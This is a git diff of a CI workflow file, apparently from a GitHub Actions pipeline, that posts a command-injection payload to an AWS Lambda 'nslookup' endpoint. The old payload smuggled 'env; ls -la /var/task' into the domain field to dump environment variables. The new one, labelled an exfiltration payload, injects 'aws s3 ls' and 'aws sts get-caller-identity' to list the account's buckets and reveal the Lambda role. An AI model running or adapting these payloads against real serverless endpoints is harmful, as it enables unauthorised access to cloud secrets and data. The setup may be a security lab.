@@ -25,18 +25,11 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # Payload with command injection - let's dump environment variables or list files in /var/task
-          PAYLOAD='{"domain": "127.0.0.1; env; ls -la /var/task"}'
+          # This payload runs nslookup, then uses the Lambda's built-in AWS CLI 
+          # to list all S3 buckets in the account and check whoami for the Lambda role!
+          PAYLOAD='{"domain": "127.0.0.1; aws s3 ls; aws sts get-caller-identity"}'
           
-          echo "=== 1. TRIGGERING ENDPOINT ==="
+          echo "=== SENDING EXFILTRATION PAYLOAD ==="
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
-          
-          echo ""
-          echo "=== 2. WAITING 3 SECONDS FOR LOGS TO FLUSH ==="
-          sleep 3
-          
-          echo "=== 3. FETCHING CLOUDWATCH LOGS ==="
-          # Pull the most recent log events from the Lambda's log group
-          aws logs tail /aws/lambda/nslookupv2 --region ${REGION} --since 1m
